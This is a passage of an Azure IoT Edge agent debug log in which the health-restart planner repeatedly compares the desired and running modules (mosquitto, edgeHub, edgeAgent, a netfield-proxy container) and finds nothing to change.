"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:49.367 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:49.374 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:49.380 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:49.381 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:54.384 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:54.384 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:54.384 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:54.385 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:54.385 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:54.386 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:54.387 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:54.410 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:54.412 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:54.421 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:54.429 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:54.435 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:54.442 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:54.442 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:29:59.441 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:29:59.442 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:29:59.442 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:59.443 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:29:59.443 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:29:59.444 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:29:59.444 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:29:59.470 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:29:59.472 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:29:59.486 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:59.490 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:29:59.496 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:29:59.505 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:29:59.505 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:30:04.506 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:30:04.507 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:30:04.507 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:04.508 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:04.508 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:30:04.509 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:30:04.509 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:30:04.534 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:30:04.536 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:30:04.551 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:04.555 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:04.560 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:30:04.572 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:30:04.572 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:30:09.564 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:30:09.565 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:30:09.566 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:09.566 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:09.567 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:30:09.567 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:30:09.568 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:30:09.604 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:30:09.607 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:30:09.623 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:09.627 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b